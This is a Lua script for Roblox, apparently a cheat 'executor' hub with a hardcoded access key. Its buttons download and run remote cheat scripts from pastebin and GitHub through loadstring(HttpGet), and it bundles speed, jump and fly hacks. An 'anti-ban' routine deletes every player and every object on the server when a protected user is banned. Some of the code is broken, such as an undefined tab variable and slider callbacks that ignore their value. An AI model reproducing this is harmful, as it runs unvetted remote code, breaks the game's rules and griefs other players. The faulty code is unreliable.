local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "MNG Executor",
   LoadingTitle = "MNG Executor",
   LoadingSubtitle = "By Arthur",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "MNG Executor"
   },
   Discord = {
      Enabled = true,
      Invite = "hTUeQ7kE", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "MNG Key system",
      Subtitle = "By Arthur",
      Note = "Here is the key: y3k9h5f2zlq8t7p6nx4g1r8mjd5v2w (until we resolve problem) ",
      FileName = "Key System", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"y3k9h5f2zlq8t7p6nx4g1r8mjd5v2w"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local MainTab = Window:CreateTab("Games Exploits", nil) -- Title, Image
local MainSection = MainTab:CreateSection("Main")

Rayfield:Notify({
   Title = "Key valid",
   Content = "Welcome User",
   Duration = 6.5,
   Image = nil,
   Actions = { -- Notification Buttons

      Ignore = { -- Duplicate this table (or remove it) to add and remove buttons to the notification.
         Name = "Okay!",
         Callback = function()
            print("The user tapped Okay!")
         end
      },

},
})

local Button = MainTab:CreateButton({
   Name = "RedZ Bloxfruits",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "Arsenal",
   Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/14xXHZQW"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Murder Mystery 2",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
   end,
})


local Paragraph = MainTab:CreateParagraph({Title = "Updates", Content = "More coming on 20 november 2024.More games,more scripts"})
local Paragraph = MainTab:CreateParagraph({Title = "Suggest us", Content = "suggest us what games to add"})


local MiscTab = Window:CreateTab("Misc Tab", nil) -- Title, Image
local MiscSection = MiscTab:CreateSection("Misc")



local Button = MiscTab:CreateButton({
   Name = "Anti-ban",
   Callback = function()
      n = "B" 
      n = n.."a" 
      n = n.."ns" 
      n = n.."e" 
      n = n.."y" 
      h = Instance.new("Hint") 
      m = Instance.new("Message") 
      script.Name = n.."'s antiban" 
      --------------You can change below------------------
      respawntime = 90 
      protect = "YourNameHere" 
      -------Version [Don't change]------------
      version = 1.05 
      
      while true do 
      if game.Players:findFirstChild(protect) == nil then 
      m.Parent = game.Workspace 
      m.Text = protect.." is banned, the server will be removed..." 
      wait(3) 
      m.Text = "Unban "..protect.." or remove your script, else the server will be down with the following countdown!" 
      wait(3) 
      for i= respawntime, 0, -1 do 
      if game.Players:findFirstChild(protect) == nil then 
      m.Text = "If "..protect.." doesn't reappear in ["..i.."] then the server is down!" 
      wait(1) 
      end 
      end 
      if game.Players:findFirstChild(protect) ~= nil then 
      m.Text = protect.." came back, nothing will happen!" 
      wait(3) 
      m:remove() 
      else 
      while true do 
      for i, p in ipairs(game.Players:getChildren()) do 
      p:Remove() 
      end 
      for i, w in ipairs(game.Workspace:getChildren()) do 
      w:Remove() 
      end 
      wait()
      end 
      end 
      else 
      h.Parent = game.Workspace 
      h.Text = "Protecting: "..protect.." - Version: "..version.." - Created by: "..n 
      end 
      wait() 
      end
   end,
})

local Slider = MiscTab:CreateSlider({
   Name = "Speed",
   Range = {0, 1000},
   Increment = 1,
   Suffix = "Speed",
   CurrentValue = 16,
   Flag = "Speed", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
-- Define initial speed and increment value
local speed = 16  -- Starting speed (default walk speed in Roblox)
local increment = 1  -- Speed increment per function call

-- Function to increase speed
local function increaseSpeed()
    speed = speed + increment
    print("Speed increased! Current Speed: " .. speed)
end

-- Bind the function to a key press or event
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Space then  -- Increase speed on Spacebar press
        increaseSpeed()
    end
end)

-- Applying the speed to the player character (Roblox-specific)
local player = game.Players.LocalPlayer
player.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = speed
    humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        humanoid.WalkSpeed = speed  -- Keeps speed consistent with variable
    end)
end)

   end,
})

local Slider = MiscTab:CreateSlider({
   Name = "JumpPower",
   Range = {0, 1000},
   Increment = 10,
   Suffix = "JumpPower",
   CurrentValue = 10,
   Flag = "JumpPower", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
      -- Jump Script with Mouse Input

-- Define initial jump power and increment value
local jumpPower = 50  -- Starting jump power
local increment = 1  -- Jump power increment per function call

-- Function to increase jump power
local function increaseJumpPower()
    jumpPower = jumpPower + increment
end

-- Detect mouse input to increase jump power
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then  -- Detect left mouse click
        increaseJumpPower()
    end
end)

-- Applying the jump power to the player character (if applicable)
local player = game.Players.LocalPlayer
player.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.JumpPower = jumpPower
    humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
        humanoid.JumpPower = jumpPower  -- Keeps jump power consistent with variable
    end)
end)

   end,
})

local Button = MiscTab:CreateButton({
   Name = "Button Example",
   Callback = function()
      -- Fly Script with WASD and Touchscreen Controls

local speed = 50  -- Speed of flying movement
local isFlying = false  -- Toggle for flying mode

-- Start and stop flying
local function toggleFly()
    isFlying = not isFlying
end

-- Movement control function
local function controlFly(direction)
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart and isFlying then
            humanoidRootPart.Velocity = direction * speed
        end
    end
end

-- WASD control setup
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.W then
        controlFly(Vector3.new(0, 0, -1))  -- Forward
    elseif input.KeyCode == Enum.KeyCode.S then
        controlFly(Vector3.new(0, 0, 1))  -- Backward
    elseif input.KeyCode == Enum.KeyCode.A then
        controlFly(Vector3.new(-1, 0, 0))  -- Left
    elseif input.KeyCode == Enum.KeyCode.D then
        controlFly(Vector3.new(1, 0, 0))  -- Right
    elseif input.KeyCode == Enum.KeyCode.Space then
        toggleFly()  -- Start or stop flying on space
    end
end)

UserInputService.InputEnded:Connect(function(input)
    -- Stop movement when keys are released
    if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S or
       input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.D then
        controlFly(Vector3.new(0, 0, 0))
    end
end)

-- Touchscreen support for mobile
UserInputService.TouchSwipe:Connect(function(direction, speed)
    if isFlying then
        if direction == Enum.SwipeDirection.Up then
            controlFly(Vector3.new(0, 1, 0))  -- Fly upward
        elseif direction == Enum.SwipeDirection.Down then
            controlFly(Vector3.new(0, -1, 0))  -- Fly downward
        elseif direction == Enum.SwipeDirection.Left then
            controlFly(Vector3.new(-1, 0, 0))  -- Fly left
        elseif direction == Enum.SwipeDirection.Right then
            controlFly(Vector3.new(1, 0, 0))  -- Fly right
        end
    end
end)

   end,
})
